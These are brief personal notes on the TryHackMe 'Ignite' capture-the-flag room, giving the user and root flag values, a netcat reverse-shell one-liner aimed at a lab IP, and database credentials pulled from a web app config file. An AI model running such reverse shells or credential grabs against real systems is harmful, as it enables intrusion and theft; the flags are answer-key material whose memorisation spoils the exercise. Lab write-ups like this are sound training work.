#TryHackMe Ignite

>Saikat Karmakar | Feb 13:2021

--------------------------------------------------------------------------

# Task 1 
1. User.txt
```
6470e394cbf6dab6a91682cc8585059b
```
2. Root.txt
```
b9bbcb33e11b80be759c4e844862482d
```


--
-----------
***Notes***
-----------

/fuel/application/views/home.php

>revshell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.23.120 1234 >/tmp/f
```

/var/www/html/fuel/application/config/databases.php

'username' => 'root',
'password' => 'mememe',

--------------------------------------------------------------------------